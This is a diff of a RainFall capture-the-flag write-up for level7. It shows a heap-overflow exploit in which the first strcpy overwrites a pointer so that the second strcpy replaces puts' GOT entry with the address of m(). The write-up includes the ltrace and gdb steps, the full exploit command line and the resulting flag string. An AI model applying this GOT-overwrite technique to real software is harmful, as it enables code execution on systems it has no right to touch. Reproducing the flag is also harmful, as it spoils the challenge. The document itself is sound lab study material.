@@ -12,12 +12,13 @@ The program:
 see source.c
 
 Theory:
-In the first call to strcpy(), update p2[1] so that the second call to strcpy() replaces the call to puts() by a call to m().
+In the first call to strcpy(), update p2[1] so that the second call to strcpy()
+replaces the call to puts() by a call to m().
 
 Let's get the offset necessary to overwrite p2[1] !
 We use ltrace to print libc calls, with https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
-ltrace ./executables/level7 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9'
+level7@RainFall:~$ ltrace ./level7 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9'
 > (...)
 > strcpy(0x9fde1b0, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9")             = 0x9fde1b0
 > strcpy(0x37614136, nil <no return ...>
@@ -25,8 +26,7 @@ ltrace ./executables/level7 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9'
 
 0x37614136 -> offset is 20
 
-
-Next, we need to find where is the pointer we need to overwrite in the GOT:
+Next, we need to find where the pointer we need to overwrite is in the GOT:
 (gdb) disas main
 > (...)
 > call   0x8048400 <puts@plt>
@@ -35,12 +35,14 @@ Next, we need to find where is the pointer we need to overwrite in the GOT:
 > jmp    *0x8049928
 
 Let's try it out:
-./level7 $(printf "0%0.s" $(seq 1 20))$(echo -ne "\x28\x99\x04\x08") lol
-> strcpy(0x91d71b0, "00000000000000000000(\231\004\b")
-> strcpy(0x8049928, "lol")
+
+level7@RainFall:~$ ltrace ./level7 $(printf "0%0.s" $(seq 1 20))$(echo -ne "\x28\x99\x04\x08") lol
+(...)
+strcpy(0x91d71b0, "00000000000000000000(\231\004\b")
+strcpy(0x8049928, "lol")
 
 We just need to put everything together :D
-The address of m() is 0x080484f4.
+The address of m() is 0x080484f4 btw.
 
-./level7 $(printf "0%0.s" $(seq 1 20))$(echo -ne "\x28\x99\x04\x08") $(echo -ne "\xf4\x84\x04\x08")
-> 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+level7@RainFall:~$ ./level7 $(printf "0%0.s" $(seq 1 20))$(echo -ne "\x28\x99\x04\x08") $(echo -ne "\xf4\x84\x04\x08")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
